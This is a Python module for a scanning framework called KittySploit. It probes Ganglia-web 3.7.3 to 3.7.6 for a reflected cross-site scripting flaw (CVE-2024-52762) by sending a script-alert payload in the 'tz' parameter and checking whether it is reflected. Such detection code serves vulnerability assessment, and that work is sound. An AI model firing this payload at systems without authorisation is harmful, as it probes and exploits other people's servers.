#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting (XSS) vulnerability in the component /master/header."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ganglia Web Interface (v3.7.3 - v3.7.6) - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting (XSS) vulnerability in the component /master/header.php of Ganglia-web v3.73 to v3.76 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the "tz" parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'ganglia', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'cve': 'CVE-2024-52762',
    }

    def run(self):
        path = '/ganglia/?tz=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('"><script>alert(document.domain)</script>">', 'ganglia_form.submit()',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='Ganglia Web Interface (v3.7.3 - v3.7.6) - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

